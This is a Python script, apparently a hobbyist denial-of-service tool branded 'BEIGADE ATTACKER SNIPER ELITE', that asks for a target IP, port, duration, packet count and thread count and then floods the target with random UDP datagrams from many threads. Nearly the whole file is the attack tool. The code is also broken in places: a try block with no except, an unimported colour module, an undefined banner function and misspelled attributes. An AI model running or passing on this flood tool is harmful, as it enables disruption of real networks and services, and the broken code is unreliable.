# CHEK IMPORT
try:
    import socket
    import threading
    import os
    import sys
    import time
    import random

# Clear terminal screen
os.system('clear')

#DATA
banner = f"""
{Fore.YELLOW}|:::::::::::|                                             / ::
{Fore.YELLOW}———— ::————/     ___   ____    ____   ___   ____         | ::
{Fore.WHITE}| ;:\ ::    / ::|/:::::\  /:::::\ | ::: | ::          | ::
{Fore.WHITE}| :: \ :: :: :: / :: | ::/ :: | ::| :: :: ::  _____   | ::
{Fore.WHITE}| ::  \ ::  ::  | :::::/ | :::::/ | :: \ :::  |::::|  | ::::::
{Fore.LIGHTYELLOW_EX}\__   \__/\__   \_____/  \_____/ |___  \___          \________
                                                               
{Fore.RED}||_________[[ BEIGADE ATTACKER SNIPER ELITE  ** By:Kun99 ]]__________||
{Fore.RESET}"""
 
print(banner)
host = ""
ip = ""

def get_user_input():
    print(" +======================================================+")
    target_ip = input(f"{Fore.LIGHTHYELLOW_EX} | Target IP : ").strip()
    target_port = input(f"{Fore.YELLOW} | Target Port : ").strip()
    attack_time = input(f"{Fore.RED} | Time (seconds) : ").strip()
    packet = input(f"{Fore.LIGHTGREEN_EX} | Packet : ").strip()
    thread_count = input(f"{Fore.LIGHTCYAN_EX} | Thread : ").strip()
    method = input(f"{Fore.CYAN} | Method (UDP/TCP & UDP Mix) : ").strip().lower()
    print(" ========================================================")

    return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method

# Display input summary after user provides inputs
def display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method):
    display_banner()  # Show the banner again
    print(" +======================================================+")
    print(f" | Target IP : {target_ip:<40}|")
    print(f" | Target Port : {target_port:<40}|")
    print(f" | Time : {attack_time:<40}|")
    print(f" | Packet : {packet:<45}|")
    print(f" | Thread : {thread_count:<45}|")
    print(f" | Method (UDP/TCP & UDP Mix) : {method:<25}|")
    print(" ========================================================")

# UDP attack function
def udp_attack(ip, port, packet, duration, thread_count):
    timeout = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)

    while time.time() < timeout:
        try:
            for _ in range(packet):
                s.sendto(data, (ip, port))
            print(f"[SNIPER-ELITE] Attacking... >  time {duration} target {ip}:{port} packet {packet} threads {thread_count}")
        except socket.error:
            s.close()
            print("[SNIPER-ELITE] Error during attack, socket closed.")
            break

# Threaded attack function
def start_attack(target_ip, target_port, packet, thread_count, method, duration):
    if method == 'udp':
        for _ in range(thread_count):
            th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
            th.start()
    else:
        print(f"{Fore.MAGENTA}[SNIPER-ELITE] Unsupported method. Only UDP supported in this version.{Fore.LIGHTMAGENTA}{Fore.RESET}")

# Main program flow
def main():
    display_banner()  # Show the banner initially
    target_ip, target_port, attack_time, packet, thread_count, method = get_user_input()
    display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method)

    # Start attack
    start_attack(target_ip, target_port, packet, thread_count, method, attack_time)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[SNIPER-ELITE] Attack interrupted. Exiting...")
        sys.exit()

